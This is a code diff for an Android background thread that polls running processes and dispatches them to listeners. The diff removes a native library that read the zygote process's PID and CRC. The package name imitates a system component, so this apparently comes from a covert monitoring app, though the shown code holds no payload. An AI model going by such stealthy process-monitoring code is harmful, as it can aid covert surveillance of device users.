@@ -14,22 +14,12 @@ import com.android.networking.auto.Cfg;
 import com.android.networking.util.Check;
 
 public class BroadcastMonitorProcess extends Thread {
-	static {
-		System.loadLibrary("runner");
-	}
 
 	/** The Constant TAG. */
 	private static final String TAG = "BroadcastMonitorProcess"; //$NON-NLS-1$
 
-	// Get PID
-	private native int gp(String process);
-
-	// Get CRC
-	private native int gc(int p);
-
 	private boolean stop;
 	private final int period;
-	private int zygotePid, crcList;
 
 	RunningProcesses runningProcess;
 
@@ -39,10 +29,8 @@ public class BroadcastMonitorProcess extends Thread {
 		stop = false;
 		period = 5000; // Poll interval
 		runningProcess = new RunningProcesses();
-		zygotePid = gp("zygote");
-
-		if (zygotePid != -1) {
-			crcList = gc(zygotePid);
+		if (Cfg.DEBUG) {
+			setName(getClass().getSimpleName());
 		}
 	}
 
@@ -53,18 +41,7 @@ public class BroadcastMonitorProcess extends Thread {
 		do {
 			if (stop) {
 				return;
-			}
-
-			if (zygotePid != -1) {
-				curCrc = gc(zygotePid);
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (run) crc: " + curCrc);
-				}
-
-				if (curCrc != crcList) {
-					crcList = curCrc;
-				}
-			}
+			}			
 
 			runningProcess.update();
 			listenerProcess.dispatch(runningProcess);
